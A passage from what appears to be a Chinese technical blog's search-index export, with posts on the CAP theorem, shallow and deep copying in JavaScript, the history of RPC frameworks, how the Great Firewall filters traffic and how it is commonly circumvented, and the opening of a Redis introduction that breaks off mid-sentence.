对于多数大型互联网应用的场景，主机众多、部署分散，而且现在的集群规模越来越大，所以节点故障、网络故障是常态，而且要保证服务可用性达到N个9，即保证P和A，舍弃C（退而求其次保证最终一致性）。虽然某些地方会影响客户体验，但没达到造成用户流程的严重程度。 例子场景 如上图，是我们证明CAP的基本场景，网络中有两个节点N1和N2，可以简单的理解N1和N2分别是两台计算机，N1和N2组成了一个完整的系统，他们的功能是相同的（functionally equlvalent），他们之间网络可以连通。 N1中有一个应用程序A，和一个数据库V，N2也有一个应用程序B2和一个数据库V。现在，A和B是分布式系统的两个部分，V是分布式系统的数据存储的两个子数据库。 说明在满足一致性时（注意，这里暗指强一致性），N1和N2中的数据是一样的，V0=V0。 在满足可用性时，用户不管是请求N1或者N2，都会得到立即响应。 在满足分区容错性时，N1和N2有任何一方宕机，或者网络不通的时候，都不会影响N1和N2彼此之间的正常运作。 作为一个分布式系统，它和单机系统的最大区别，就在于网络，现在假设一种极端情况，N1和N2之间的网络断开了，我们要支持这种网络异常，相当于要满足分区容错性，这时能不能同时也满足一致性和响应性呢？ 假设在N1和N2之间网络断开的时候，有用户向N1发送数据更新请求，那N1中的数据V0将被更新为V1，由于网络是断开的，所以分布式系统同步操作M不能成功被执行，所以N2中的数据依旧是V0。 这个时候，有用户向N2发送数据读取请求，由于数据还没有进行同步，应用程序没办法立即给用户返回最新的数据V1，怎么办呢？ 有二种选择： 情况1：牺牲数据一致性，保证可用性。N2直接响应旧的数据V0给用户； 情况2：牺牲可用性，保证数据一致性。阻塞等待，直到网络连接恢复，分布式系统同步操作M完成之后，N2再给用户响应最新的数据V1。 这个过程，证明了要满足分区容错性的分布式系统，只能在一致性和可用性两者中，选择其中一个。 Reference CAP Theorem and Distributed Database Management Systems - https://towardsdatascience.com/cap-theorem-and-distributed-database-management-systems-5c2be977950e Understanding the CAP Theorem - https://dzone.com/articles/understanding-the-cap-theorem An Illustrated Proof of the CAP Theorem - https://mwhittaker.github.io/blog/an_illustrated_proof_of_the_cap_theorem/ 分布式系统的CAP理论 - https://www.hollischuang.com/archives/666 Spanner, TrueTime and the CAP Theorem - https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45855.pdf CAP Twelve Years Later: How the “Rules” Have Changed - https://www.infoq.com/articles/cap-twelve-years-later-how-the-rules-have-changed CAP理论 - https://blog.csdn.net/chen77716/article/details/30635543 一文带你重新审视CAP理论与分布式系统设计 - https://dbaplus.cn/news-159-1917-1.html 数据一致性-分区可用性-性能——多副本强同步数据库系统实现之我见 - http://hedengcheng.com/?p=892 CAP 定理的含义 - http://www.ruanyifeng.com/blog/2018/07/cap.html","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【OOP】对象的深拷贝（Deep Copy）与浅拷贝（Shallow Copy）","date":"2019-01-07T14:46:12.000Z","path":"2019/01/07/【OOP】对象的深拷贝与浅拷贝/","text":"数据类型数据分为基本数据类型（String，Number，Boolean，Null，Undefined，Symbol）和对象数据类型。 基本数据类型的特点：直接存储在栈（stack）中的数据 引用数据类型的特点：存储的是该对象在栈（Stack）中引用，真实的数据存放在堆（Heap）内存里 引用数据类型在栈中存储了指针，该指针指向堆中该实体的起始地址。当解释器寻找引用值时，会首先检索其在栈中的地址，取得地址后从堆中获得实体。 浅拷贝（Shallow Copy）与深拷贝（Deep Copy）深拷贝和浅拷贝是只针对Object和Array这样的引用数据类型的。而对于值类型而言，所有的拷贝都是深拷贝。 浅拷贝（Shallow Copy）浅拷贝会基于原对象，在堆或者栈中实例化一个新的对象，而对于该新对象中的字段（field）为不同数据类型时，会进行不同的处理： 当字段为基本数据类型，该字段会被复制一份，并作为新对象的对应字段。 当字段为对象数据类型，该对象在堆中的地址会被复制，并作为新对象的对应字段的值（此过程中，不存在新对象的实例化）。因此，新旧对象对应的这个字段都指向堆内存中同一个区域。 深拷贝（Deep Copy）与浅拷贝类似，深拷贝也会基于原对象，在堆或者栈中实例化一个新的对象。而不同点在，对于该新对象中的字段（field）为不同数据类型时，都会进行同样的处理，即： 当字段为基本数据类型，该字段会被复制一份，并作为新对象的对应字段。 当字段为对象数据类型，该字段指向的对象会被重新创建一个，新创建的对象副本（在堆中的地址）作为新对象的对应字段的值 赋值和浅拷贝的区别赋值当我们把一个对象（或称为”引用数据类型“）赋值给一个新的变量时，赋的其实是该对象指向于堆中的那个地址值，而不是堆中的数据。也就是两个对象指向的是同一个存储在堆的内存空间。 因此，无论引用哪个变量，其实都是改变的这个内存空间的内容。所以，两个对象是联动的。 浅拷贝浅拷贝是按位拷贝对象，它会创建一个新对象，这个对象有着原始对象属性值的一份精确拷贝。 如果属性是基本类型，拷贝的就是基本类型的值；如果属性是内存地址（引用类型），拷贝的就是内存地址 ，因此如果其中一个对象改变了这个地址，就会影响到另一个对象。即默认拷贝构造函数只是对对象进行浅拷贝复制(逐个成员依次拷贝)，即只复制对象空间而不复制资源。 例子对象赋值1234567891011// 对象赋值 var obj1 = &#123; 'name' : 'zhangsan', 'age' : '18', 'language' : [1,[2,3],[4,5]],&#125;;var obj2 = obj1;obj2.name = \"lisi\";obj2.language[1] = [\"二\",\"三\"];console.log('obj1',obj1)console.log('obj2',obj2) 运行结果 分析可以看到，由于 var obj2 = obj1; 的本质是将obj1所指向的对象的内存地址赋值给obj2，因此无论使用obj1还是obj2，本质上都是在操作同一块堆内存。 浅拷贝情况11234567891011121314151617181920212223// 浅拷贝1var obj1 = &#123; 'name' : 'zhangsan', 'age' : '18', 'language' : [1,[2,3],[4,5]],&#125;;var obj3 = shallowCopy(obj1);obj3.name = \"lisi\";obj3.language = [\"一\",\"二\",\"三\"];console.log('obj1',obj1)console.log('obj3',obj3)function shallowCopy(src) &#123; var dst = &#123;&#125;; for (var prop in src) &#123; if (src.hasOwnProperty(prop)) &#123; dst[prop] = src[prop]; &#125; &#125; return dst;&#125; 运行结果 分析对于obj3.language = [&quot;一&quot;,&quot;二&quot;,&quot;三&quot;];而言，obj3.language是一个引用数据类型。因此，最终obj3对象的language字段会指向[&quot;一&quot;,&quot;二&quot;,&quot;三&quot;]所在的堆内存。而obj1对象的language字段仍然指向[1,[2,3],[4,5]]所在的堆内存，因此值不会被改变。 情况21234567891011121314151617181920// 浅拷贝2 var obj1 = &#123; 'name' : 'zhangsan', 'age' : '18', 'language' : [1,[2,3],[4,5]],&#125;; var obj3 = shallowCopy(obj1); obj3.name = \"lisi\"; obj3.language[1] = [\"二\",\"三\"]; function shallowCopy(src) &#123; var dst = &#123;&#125;; for (var prop in src) &#123; if (src.hasOwnProperty(prop)) &#123; dst[prop] = src[prop]; &#125; &#125; return dst;&#125;console.log('obj1',obj1)console.log('obj3',obj3) 运行结果 分析对于 obj3.language[1] = [&quot;二&quot;,&quot;三&quot;]; ： 由于language字段为一个引用数据类型，因此obj1和obj3的language字段均指向同一个堆内存地址。 所以obj1.language[1]和obj3.language[1]均指向同一个堆内存地址。 最终，obj3.language[1] = [&quot;二&quot;,&quot;三&quot;];的执行会改变obj1.language[1]和obj3.language[1]的值。 Reference 浅拷贝与深拷贝 - http://web.jobbole.com/95554/ 细说 Java 的深拷贝和浅拷贝 - https://www.cnblogs.com/plokmju/p/7357205.html","comments":true,"categories":[{"name":"OOP","slug":"OOP","permalink":"http://swsmile.info/categories/OOP/"}],"tags":[{"name":"OOP","slug":"OOP","permalink":"http://swsmile.info/tags/OOP/"}]},{"title":"【Distributed System】远程过程调用（Remote Procedure Call，RPC）","date":"2019-01-07T09:54:07.000Z","path":"2019/01/07/【Distributed-System】远程过程调用RPC/","text":"什么是远程过程调用（Remote Procedure Call，RPC）RPC 是远程过程调用（Remote Procedure Call）的缩写形式。 Birrell 和 Nelson 在 1984 发表于 ACM Transactions on Computer Systems 的论文《Implementing remote procedure calls》对 RPC 做了经典的诠释。RPC 是指计算机 A 上的进程，调用另外一台计算机 B 上的进程，其中 A 上的调用进程被挂起，而 B 上的被调用进程开始执行，当值返回给 A 时，A 进程继续执行。调用方可以通过使用参数将信息传送给被调用方，而后可以通过传回的结果得到信息。而这一过程，对于开发人员来说是透明的。 RPC 的主要好处有两个： 程序员可以使用过程调用语义来调用远程函数并获取响应。 简化了编写分布式应用程序的难度，因为 RPC 隐藏了所有的网络代码存根函数。应用程序不必担心一些细节，比如 socket、端口号以及数据的转换和解析。在 OSI 参考模型中，RPC 跨越了会话层和表示层。 RPC 使用的通信协议RPC 可以灵活使用其所基于的协议，如果基于 HTTP，则与 Web Service 就没有什么区别了，如基于更底层的协议（如 TCP ），则会比 Web Service 相对更为高效。 第一代 RPC ONC RPC DCE RPC ONC RPC（以前称为 Sun RPC）Sun 公司是第一个提供商业化 RPC 库和 RPC 编译器。在1980年代中期 Sun 计算机提供 RPC，并在 Sun Network File System(NFS) 得到支持。该协议被主要以 Sun 和 AT&amp;T 为首的 Open Network Computing （开放网络计算）作为一个标准来推动。这是一个非常轻量级 RPC 系统可用在大多数 POSIX 和类 POSIX 操作系统中使用，包括 Linux、SunOS、OS X 和各种发布版本的 BSD。这样的系统被称为 Sun RPC 或 ONC RPC。 ONC RPC 提供了一个编译器，需要一个远程过程接口的定义来生成客户机和服务器的存根函数。这个编译器叫做 rpcgen。在运行此编译器之前，程序员必须提供接口定义。包含函数声明的接口定义，通过版本号进行分组，并被一个独特的程序编码来标识。该程序编码能够让客户来确定所需的接口。版本号是非常有用的,即使客户没有更新到最新的代码仍然可以连接到一个新的服务器，只要该服务器还支持旧接口。 分布式计算环境中的 RPC(DCE RPC)DCE(Distributed Computing Environment，分布式计算环境)是一组由OFS(Open Software Foundation，开放软件基金会)设计的组件，用来提供支持分布式应用和分布式环境。与 X/Open 合并后,这组织成为了 The Open Group （开放式开发组）。DCE 提供的组件包括一个分布式文件服务、时间服务、目录服务以及其他服务。当然，我们感兴趣的是 DCE 的远程过程调用。它非常类似于 Sun RPC。接口是由 Interface Definition Notation (IDN) 定义的。类似于 Sun RPC，接口定义就像函数原型。 Sun RPC 不足之处在于，服务器的标识是一个“独特”的 32-bit 数字。虽然这是一个比在 socket 中 16-bit 可用空间更大的空间，但仍然无法满足数字唯一性的需求。DCE RPC 考虑到了这一缺陷，它无需程序员来处理编码。在编写应用程序时的第一步是从 uuidgen 程序获得一个惟一的 ID。这个程序会生成一个包含 ID 接口的原型 IDN 文件，并保证永远不会再次使用。它是一个 128-bit 的值，其中包含一个位置代码和创建时间的编码。然后用户编辑原型文件，填写远程过程声明。 在这一步后，IDN 的编译器 dceidl（类似于 rpcgen）会生成一个头、客户机存根和服务器存根。 Sun RPC 的另一个缺陷是，客户端必须知道服务器在哪台机器上。当它要访问时，必须要询问机器上的 RPC 名称服务程序编码所对应的端口号。DCE 支持将多个机器组织成为管理实体，称为 cells。cell 目录服务器使得每台机器知道如何与另外一台负责维护 cell 信息服务机器交互。 第二代 RPC：支持对象 微软 DCOM（COM+） CORBA Java RMI 面向对象的语言开始在1980年代末兴起，很明显，第一代 RPC（当时的 Sun ONC 和 DCE RPC 系统）都没有提供任何支持诸如从远程类实例化远程对象、跟踪对象的实例或提供支持多态性。 微软 DCOM（COM+）1992年4月,微软发布 Windows 3.1 包括一种机制称为 OLE (Object Linking and Embedding)。这允许一个程序动态链接其他库来支持的其他功能。如将一个电子表格嵌入到 Word 文档。OLE 演变成了 COM (Component Object Model)。一个 COM 对象是一个二进制文件。使用 COM 服务的程序来访问标准化接口的 COM 对象而不是其内部结构。COM 对象用全局唯一标识符(GUID)来命名，用类的 ID 来识别对象的类。几种方法来创建一个 COM 对象(例如 CoGetInstanceFromFile)。COM 库在系统注册表中查找相应的二进制代码(一个 DLL 或可执行文件)，来创建对象，并给调用者返回一个接口指针。COM 的着眼点是在于同一台计算机上不同应用程序之间的通讯需求. DCOM（ Distributed Component Object Model）是 COM 的扩展，它支持不同的两台机器上的组件间的通信，而且不论它们是运行在局域网、广域网、还是 Internet 上。借助 DCOM 你的应用程序将能够进行任意空间分布。DCOM 于1996年在 Windows NT4.0 中引入的，后来更名为 COM+。由于 DCOM 是为了支持访问远程 COM 对象，需要创建一个对象的过程，此时需要提供服务器的网络名以及类 ID。微软提供了一些机制来实现这一点。最透明的方式是远程计算机的名称固定在注册表（或 DCOM 类存储）里，与特定类 ID 相关联。以此方式，应用程序不知道它正在访问一个远程对象，并且可以使用与访问本地 COM 对象相同的接口指针。另一方面，应用程序也可指定一个机器名作为参数。 由于 DCOM 是 COM 这个组件技术的无缝升级，所以你能够从你现有的有关 COM 得知识中获益，你的以前在 COM 中开发的应用程序、组件、工具都可以移入分布式的环境中。DCOM 将为你屏蔽底层网络协议的细节，你只需要集中精力于你的应用。 CORBA虽然 DCE 修复的一些 Sun RPC 的缺点，但某些缺陷依然存在。例如，如果服务器没有运行，客户端是无法连接到远程过程进行调用的。管理员必须要确保在任何客户端试图连接到服务器之前将服务器启动。如果一个新服务或接口添加到了系统，客户端是不能发现的。最后,面向对象语言期望在函数调用中体现多态性，即不同类型的数据的函数的行为应该有所不同，而这点恰恰是传统的 RPC 所不支持的。 CORBA (Common Object Request Broker Architecture) 就是为了解决上面提到的各种问题。是由 OMG 组织制订的一种标准的面向对象应用程 序体系规范。或者说 CORBA 体系结构是对象管理组织（OMG）为解决分布式处理环境（DCE）中，硬件和软件系统的互连而提出的一种解决方案。 Java RMICORBA 旨在提供一组全面的服务来管理在异构环境中（不同语言、操作系统、网络）的对象。Java 在其最初只支持通过 socket 来实现分布式通信。1995年，作为 Java 的缔造者，Sun 公司开始创建一个 Java 的扩展，称为 Java RMI（Remote Method Invocation，远程方法调用）。Java RMI 允许程序员创建分布式应用程序时，可以从其他 Java 虚拟机（JVM）调用远程对象的方法。 一旦应用程序（客户端）引用了远程对象，就可以进行远程调用了。这是通过 RMI 提供的命名服务（RMI 注册中心）来查找远程对象，来接收作为返回值的引用。Java RMI 在概念上类似于 RPC，但能在不同地址空间支持对象调用的语义。 与大多数其他诸如 CORBA 的 RPC 系统不同，RMI 只支持基于 Java 来构建，但也正是这个原因， RMI 对于语言来说更加整洁，无需做额外的数据序列化工作。 Java RMI采用 TCP/IP协议，客户端直接调用服务端上的一些方法。优点是强类型，编译期可检查错误，缺点是只能基于 Java 语言，客户机与服务器紧耦合。 第三代 RPC 以及 Web Services JSON-RPC XML-RPC SOAP Microsoft .NET Remoting 由于互联网的兴起，Web 浏览器成为占主导地位的用于访问信息的模型。现在的应用设计的首要任务大多数是提供用户通过浏览器来访问，而不是编程访问或操作数据。 网页设计关注的是内容。解析展现方面往往是繁琐的。传统 RPC 解决方案可以工作在互联网上，但问题是，他们通常严重依赖于动态端口分配，往往要进行额外的防火墙配置。 Web Services 成为一组协议,允许服务被发布、发现，并用于技术无关的形式。即服务不应该依赖于客户的语言、操作系统或机器架构。 Web Services 的实现一般是使用 Web 服务器作为服务请求的管道。客户端访问该服务，首先是通过一个 HTTP 协议发送请求到服务器上的 Web 服务器。Web 服务器配置识别 URL 的一部分路径名或文件名后缀并将请求传递给特定的浏览器插件模块。这个模块可以除去头、解析数据(如果需要),并根据需要调用其他函数或模块。对于这个实现流，一个常见的例子是浏览器对于 Java Servlet 的支持。HTTP 请求会被转发到 JVM 运行的服务端代码来执行处理。 XML-RPC 、JSON-RPC，常见的语境是利用 HTTP 协议作为调用控制协议。并将 XML 和 JSON 作为对象序列化之后的格式。 JSON-RPC 可以选择基于 TCP 或 HTTP Java语言中较好的 JSON-RPC 实现框架有jsonrpc4j、jpoxy、json-rpc XML-RPC 基于 HTTP 请求被编码放入 XML 并通过 HTTP POST 传输 服务端处理过程 读取并解析 XML 执行调用方法 将执行结果存入 XML 返回XML结果给客户端 SOAP（simple object access protoal，简单对象访问协议） 基于 HTTP POST SOAP 指定 XML 作为无状态的消息交换格式 SOAP 只是一种消息格式，并未定义垃圾回收、对象引用、存根生成和传输协议。 SOAP（Simple Object Access Protocol，简单对象访问协议），是以 XML-RPC 规范作为创建 SOAP 的依据，成立于1998年，获得微软和 IBM 的大力支持。该协议在创建初期只作为一种对象访问协议，但由于 SOAP 的发展，其协议已经不单只是用于简单的访问对象，所以这种 SOAP 缩写已经在标准的1.2版后被废止了。1.2版在2003年6月24日成为 W3C 的推荐版本。SOAP 指定 XML 作为无状态的消息交换格式，包括了 RPC 式的过程调用。 SOAP是在XML-RPC基础上，使用标准的XML描述了RPC的请求信息（URI/类/方法/参数/返回值）。无论Jave RMI还是DCOM，他们都耦合于特定的编程语言。SOAP希望能够推出一种RPC通信不依赖于任何操作系统、编程语言，最终实现可相互操作性（Interoperability）。 SOAP可支持任何传输协议，从HTTP/HTTPS到SMTP（Simple Mail Transfer Protocol，简单邮件传送协议），甚至JMS（Java Messaging Service，Java消息传递服务）。不过，由于XML较为冗长且解析费时，因此采用XML也成为一个弊端。 参考： https://www.quora.com/What-is-the-difference-between-xml-rpc-and-soap https://stackoverflow.com/questions/80112/whats-the-difference-between-xml-rpc-and-soap http://weblog.masukomi.org/2006/11/21/xml-rpc-vs-soap/ https://maxivak.com/rest-vs-xml-rpc-vs-soap/ http://www.differencebetween.net/technology/internet/difference-between-rpc-and-soap/ Microsoft .NET Remoting从微软的产品角度来看，可以说 .NET Remoting 就是 DCOM 的一种升级，它改善了很多功能，并极好的融合到 .NET 平台下。Microsoft .NET Remoting 提供了一种允许对象通过应用程序域与另一对象进行交互的框架。 .NET Remoting 提供了一种允许对象通过应用程序域与另一对象进行交互的框架。这种框架提供了多种服务，包括激活和生存期支持，以及负责与远程应用程序进行消息传输的通讯通道。格式化程序用于在消息通过通道传输之前，对其进行编码和解码。应用程序可以在注重性能的场合使用二进制编码，在需要与其他远程处理框架进行交互的场合使用 XML 编码。在从一个应用程序域向另一个应用程序域传输消息时，所有的 XML 编码都使用 SOAP 协议。出于安全性方面的考虑，远程处理提供了大量挂钩，使得在消息流通过通道进行传输之前，安全接收器能够访问消息和序列化流 Java 对 Web Services的支持Java RMI 与远程对象进行交互，其实现是需要基于 Java 的模型。此外,它没有使用 Web Services 和基于 HTTP 的消息传递。 JAX-WS是JDK自带的Web服务的API，它可以用于提供REST式或基于SOAP的服务。 现在，已经出现了大量的软件来支持基于 Java 的 Web Services。JAX-WS (Java API for XML Web Services) 就是作为 Web Services 消息和远程过程调用的规范。 注意，JAX-WS只是一个Java通过 Web Services 实现RPC的一个规范，而遵循这个规范对应的实现由很多种，比如 Jersey Apache CXF Apache Axis 2 xfire JAX-WS 的一个目标是平台互操作性。其 API 使用 SOAP 和WSDL。双方不需要 Java 环境。 第四代RPC REST Apache Thrift gRPC SOAP 虽然仍然是广泛部署应用，但在许多环境中很多厂商已经抛弃了 SOAP，转而使用其他更轻量、更容易理解、或者与 Web 交互模型更干净的机制。例如，Google 的 API 在2006年后就不再支持 SOAP 接口，而是使用AJAX、XML-RPC 和 REST 作为替代。一个匿名的微软员工批评 SOAP 过于复杂，因为“我们希望我们的工具来阅读它，而不是人”。不管上述言论是否准确，有一点是可以肯定的，SOAP 显然是一个复杂和高度冗长的格式。 REST（REpresentational State Transfer） 基于HTTP SOAP 在创建自己的消息传递协议时是基于HTTP，但实际上 REST （REpresentational State Transfer）的方式才是保持 Web 的原理和使用 HTTP 协议的核心部分。 原始的 HTTP 协议已经定义了四个命令，清晰地映射到各种数据（定义为“资源”）操作: PUT (插入) GET (选择) POST (更新) DELETE (删除) Apache Thrift 跟一些替代选择，比如 SOAP 相比，跨语言序列化的代价更低，因为它使用二进制格式。 可基于 HTTP 或者 TCP 支持 JSON 或二进制消息格式 Thrift 是 Facebook 于2007年开发的跨语言的 RPC 服务框架，提供多语言的编译功能，并提供多种服务器工作模式；用户通过Thrift的IDL（Interface Description Language，接口定义语言）来描述接口函数及数据类型，然后通过Thrift的编译环境生成各种语言类型的接口文件，用户可以根据自己的需要采用不同的语言开发客户端代码和服务器端代码。 Apache Thrift可作为REST的替代品，它用来编写可跨平台的RPC客户端/服务端，提供C语言式的风格以IDL的形式来定义你的API。 换句话说，Thrift提供跨语言的服务框架，这种跨语言主要体现在它对多种语言的编译功能的支持，用户只需要使用IDL描述好接口函数，只需要一条简单的命令，Thrift就能够把按照IDL格式描述的接口文件翻译成各种语言版本。 Thrift是为了解决facebook系统中各系统间大数据量的传 输通信以及系统之间语言环境不同需要跨平台的特性。所以thrift可以支持多种程序语言，例如: C++, C#, Cocoa, Erlang, Haskell, Java, Ocami, Perl, PHP, Python, Ruby, Smalltalk. 在多种不同的语言之间通信thrift可以作为二进制的高性能的通讯中间件，支持数据(对象)序列化和多种类型的RPC服务。 gRPCgRPC是一个高性能、通用的开源RPC框架，其由Google主要面向移动应用开发并基于 HTTP/2 协议标准而设计，基于ProtoBuf(Protocol Buffers)序列化协议开发，且支持众多开发语言。 gRPC提供了一种简单的方法来精确地定义服务和为iOS、Android和后台支持服务自动生成可靠性很强的客户端功能库。 客户端充分利用高级流和链接功能，从而有助于节省带宽、降低的TCP链接次数、节省CPU使用、和电池寿命。 gRPC具有以下重要特征： 强大的IDL特性 RPC使用ProtoBuf来定义服务，ProtoBuf是由Google开发的一种数据序列化协议，性能出众，得到了广泛的应用。 支持多种语言 支持C++、Java、Go、Python、Ruby、C#、Node.js、Android Java、Objective-C、PHP等编程语言。 3.基于HTTP/2标准设计 Reference Implementing Remote Procedure Calls - http://www.birrell.org/andrew/papers/ImplementingRPC.pdf 远程过程调用(RPC)详解 - https://waylau.com/remote-procedure-calls/ 《Web Services: Principles and Technology》 gRPC的那些事 - streaming - https://colobu.com/2017/04/06/dive-into-gRPC-streaming/","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Network】GFW学习","date":"2019-01-06T13:18:48.000Z","path":"2019/01/06/【Network】GFW学习/","text":"GFW是啥总的来说，GFW是一个分布式的入侵检测系统，并不是一个严格意义上的防火墙。不是说每个出入国境的IP包都需要先经过GFW的首可。做为一个入侵检测系统，GFW把你每一次访问facebook都看做一次入侵，然后在检测到入侵之后采取应对措施，也就是常见的连接重置。 手段IP黑名单RST包中断TCP协议规定，只要看到RST包，连接立马被中断。从浏览器里来看就是连接已经被重置。我想对于这个错误大家都不陌生。据我个人观感，这种封锁方式是GFW目前的主要应对手段。大部分的RST是条件触发的，比如URL中包含某些关键字。目前享受这种待遇的网站就多得去了，著名的有facebook。还有一些网站，会被无条件RST。也就是针对特定的IP和端口，无论包的内容就会触发RST。比较著名的例子是https的wikipedia。GFW在TCP层的应对是利用了IPv4协议的弱点，也就是只要你在网络上，就假装成任何人发包。所以GFW可以很轻易地让你相信RST确实是Google发的，而让Google相信RST是你发的。 DNS劫持这也是一种常见的人工检测之后的应对。人工发现一个不和谐网站，然后就把这个网站的域名给加到劫持列表中。其原理是基于DNS与IP协议的弱点，DNS与IP这两个协议都不验证服务器的权威性，而且DNS客户端会盲目地相信第一个收到的答案。所以你去查询facebook.com的话，GFW只要在正确的答案被返回之前抢答了，然后伪装成你查询的DNS服务器向你发错误的答案就可以了。 规避方法●使用/etc/hosts文件 ●直接指定IP地址访问 ●本地DNS缓存 DNS污染DNS（Domain Name System）污染是GFW的一种让一般用户由于得到虚假目标主机IP而不能与其通信的方法，是一种DNS缓存投毒攻击（DNS cache poisoning）。其工作方式是：对经过GFW的在UDP端口53上的DNS查询进行入侵检测，一经发现与关键词相匹配的请求则立即伪装成目标域名的解析服务器（NS，Name Server）给查询者返回虚假结果。由于通常的DNS查询没有任何认证机制，而且DNS查询通常基于的UDP是无连接不可靠的协议，查询者只能接受最先到达的格式正确结果，并丢弃之后的结果。 规避方法●使用OpenDNS ●8.8.8.8 IP路由劫持深度包检测规避方法 加密代理法 TOR ssh -D gappproxy Psiphon 无界 自由门 变更协议 UDP IPv6 SDPY(不成熟) VPN法 PPTP L2TP OpenVPN 探索GFW在哪里https://github.com/fqrouter/qiang 其原理是基于一个IP协议的特性叫TTL。TTL是Time to Live的简写。IP包在每经过一次路由的时候，路由器都会把IP包的TTL减去1。如果TTL到零了，路由器就不会再把IP包发给下一级路由。然后我们知道GFW会在监听到不和谐的IP包之后发回RST包来重置TCP连接。那么通过设置不同的TTL就可以知道从你的电脑，到GFW之间经过了几个路由器。比如说TTL设置成9不触发RST，但是10就触发RST，那么到GFW就是经过了10个路由器。另外一个IP协议的特性是当TTL耗尽的时候，路由器应该发回一个TTL EXCEEDED的ICMP包，并把自己的IP地址设置成SRC（来源）。结合这两点，就可以探测出IP包是到了IP地址为什么的路由器之后才被GFW检测到。有了IP地址之后，再结合IP地址地理位置的数据库就可以知道其地理位置。 Reference Internet Censorship in China: Where Does the Filtering Occur? - http://web.eecs.umich.edu/~zmao/Papers/china-censorship-pam11.pdf The Great Firewall Revealed - http://www.internetfreedom.org/files/WhitePaper/ChinaGreatFirewallRevealed.pdf Ignoring the Great Firewall of China - https://www.cl.cam.ac.uk/~rnc1/ignoring.pdf 全面学习GFW - https://cokebar.info/archives/253 深入理解GFW：DNS污染 - http://gfwrev.blogspot.com/ GFW的工作原理（3）——IP封锁，最可恶的手段 - https://xijie.wordpress.com/2015/01/28/gfw%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%883%EF%BC%89ip%E5%B0%81%E9%94%81%EF%BC%8C%E6%9C%80%E5%8F%AF%E6%81%B6%E7%9A%84%E6%89%8B%E6%AE%B5%EF%BC%81/ [扫盲]介绍一下GFW的工作原理和封锁技术 - https://blog.csdn.net/eerstar/article/details/47866703 GFW 的工作原理及突破技术 - https://markmail.org/download.xqy?id=xx5ti2rn76jyizr6&amp;number=1 http://www.chinagfw.org/ 深入理解GFW：DNS污染 - http://gfwrev.blogspot.com/2009/11/gfwdns.html 3 DNS污染与应对 - https://github.com/lifetyper/FreeRouter/wiki/3-DNS%E6%B1%A1%E6%9F%93%E4%B8%8E%E5%BA%94%E5%AF%B9","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Redis】Redis 入门","date":"2019-01-06T07:58:19.000Z","path":"2019/01/06/【Redis】Redis入门/","text":"关于Redis 完全基于内存，绝大部分请求是纯粹的内存操作，非常快速。数据存在内存中，类似于HashMap，HashMap的优势就是查找和操作的时间复杂度都是O(1)； 数据结构简单，对数据操作也简单，Redis中的数据结构是专门进行设计的； 采用单线程，避免了不必要的上下文切换和竞争条件，也不存在多进程或者多线程导致的切换而消耗 CPU，不用去考虑各种锁的问题，不存在加锁释放锁操作，没有因为可能出现死锁而导致的性能消耗； 使用多路I/O复用模型，非阻塞IO。 基本使用启动1$ redis-server 停止1$ redis-cli SHUTDOWN 进入交互1$ redis-cli 多数据库Redis是一个字典结构的存储服务器，而实际上一个Redis实例提供了多个用来存储数据的字典，客户端可以指定将数据存储在哪个字典中，这与我们熟知的在一个关系数据库实例中可以创建多个数据库类似，所以可以将其中的每个字典都理解成一个独立的数据库。 每个数据库对外都是以一个从0开始的递增数字命名，Redis默认支持16个数据库， 可以通过配置参数databases来修改这一数字。客户端与Redis建立连接后会自动选择0号数据。 1234redis&gt; select 1OKredis [1]&gt; GET foo(nil) Redis的事件Redis服务器是一个事件驱动程序，服务器需要处理以下两类事件： 文件事件（file event）: Redis服务器通过套接字与客户端（或者其他Redis服务器) 进行连接，而文件事件就是服务器对套接字操作的抽象。服务器与客户端（或者其他服务器）的通信会产生相应的文件事件，而服务器则通过监听并处理这些事件来完成一系列网络通信操作。 时间事件（time event）: Redis服务器中的一些操作（比如serverCron函数）需要在给定的时间点执行，而时间事件就是服务器对这类定时操作的抽象。 文件事件Redis基于Reactor模式开发了自己的网络事件处理器：这个处理器被称为文件事件处理器（file event handler): 文件事件处理器使用I/O多路复用（multiplexing）程序来同时监听多个套接字，并根据套接字目前执行的任务来为套接字关联不同的事件处理器。 当被监听的套接字准备好执行连接应答（accept）、读取（read）、写入（write）、关闭（close）等操作时，与操作相对应的文件事件就会产生，这时文件事件处理器就会调用套接字之前关联好的事件处理器来处理这些事件。 虽然文件事件处理器以单线程方式运行，但通过使用I/O多路复用程序来监听多个套接字，文件事件处理器既实现了高性能的网络通信模型，又可以很好地与Redis服务器中其他同样以单线程方式运行的模块进行对接，这保持了 Redis 内部单线程设计的简单性。 文件事件处理器 上图展示了文件事件处理器的四个组成部分：套接字、I/O多路复用程序、文件事件分派器（dispatcher），以及亊件处理器。 文件事件是对套接字操作的抽象，每当一个套接字准备好执行连接应答 (accept)、写人、读取、关闭等操作时，就会产生一个文件亊件。因为一个服务器通常会连接多个套接字，所以多个文件事件有可能会并发地出现。 I/O多路复用程序负责监听多个套接字，并向文件事件分派器传送那些产生了事件的套接字。 尽管多个文件事件可能会并发地出现，但I/O多路复用程序总是会将所有产生事件的套接字都放到一个队列里面，然后通过这个队列，以有序（sequentially)、同步 (synchronously)、每次一个套接字的方式向文件事件分派器传送套接字。当上一个套接字产 生的事件被处理完毕之后（该套接字为事件所关联的亊件处理器执行完毕），I/O多路复用 程序才会继续向文件事件分派器传送下一个套接字，如下图所示。 文件事件分派器接收I/O多路复用程序传来的套接字，并根据套接宇产生的事件的类 型，调用相应的車件处理器。 服务器会为执行不同任务的套接宇关联不同的事件处理器，这些处理器是一个个函数， 它们定义了某个事件发生时，服务器应该执行的动作。 I/O多路复用程序的实现Redis的I/O多路复用程序的所有功能都是通过包装常见的select、epoll、evport 和kqueue这些I/O多路复用函数库来实现的，每个I/O多路复用函数库在Redis源码中都 对应一个单独的文件，比如ae_select.c、ae 